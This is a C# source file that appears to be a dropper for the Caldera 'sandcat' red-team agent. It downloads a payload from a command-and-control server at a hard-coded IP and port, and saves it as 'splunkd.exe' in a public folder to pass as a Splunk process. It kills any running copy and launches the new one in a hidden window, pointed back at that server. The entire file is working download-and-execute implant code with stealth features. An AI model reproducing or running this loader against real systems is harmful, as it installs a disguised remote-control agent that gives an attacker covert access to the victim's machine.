using System;
using System.Diagnostics;
using System.IO;
using System.Net;

class Program
{
    static void Main()
    {
        string server = "http://192.168.1.129:8888";
        string url = $"{server}/file/download";
        string filePath = @"C:\Users\Public\splunkd.exe";

        // Download the file
        using (WebClient wc = new WebClient())
        {
            wc.Headers.Add("platform", "windows");
            wc.Headers.Add("file", "sandcat.go");
            byte[] data = wc.DownloadData(url);

            // Stop process if running
            foreach (Process proc in Process.GetProcesses())
            {
                foreach (ProcessModule module in proc.Modules)
                {
                    if (module.FileName.Equals(filePath, StringComparison.OrdinalIgnoreCase))
                    {
                        proc.Kill();
                        proc.WaitForExit();
                    }
                }
            }

            // Remove file if exists
            if (File.Exists(filePath))
            {
                File.Delete(filePath);
            }

            // Write the downloaded file
            File.WriteAllBytes(filePath, data);

            // Start the new process
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = filePath,
                Arguments = $"-server {server} -group red",
                WindowStyle = ProcessWindowStyle.Hidden
            };
            Process.Start(startInfo);
        }
    }
}
